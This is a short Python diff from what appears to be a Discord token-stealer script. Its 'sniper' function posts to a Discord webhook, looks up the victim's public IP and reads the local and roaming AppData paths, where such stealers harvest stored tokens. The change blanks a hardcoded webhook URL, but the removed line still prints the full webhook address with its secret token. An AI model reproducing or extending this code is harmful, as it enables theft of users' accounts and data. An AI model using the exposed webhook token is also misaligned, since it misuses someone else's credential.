@@ -22,7 +22,7 @@ def xxisniff(path):
         pass
 
 def sniper():
-    hook = Webhook("https://discord.com/api/webhooks/822212823047209012/tJFS4RvYBGmegVUVHbQjfPXQViEzOwSGl9rlsUYvwhXAXIUtpo9PtHrvdexVClWiSQUd")
+    hook = Webhook("")
     hostname = requests.get("https://api.ipify.org").text 
     local = os.getenv('LOCALAPPDATA')
     roaming = os.getenv('APPDATA')
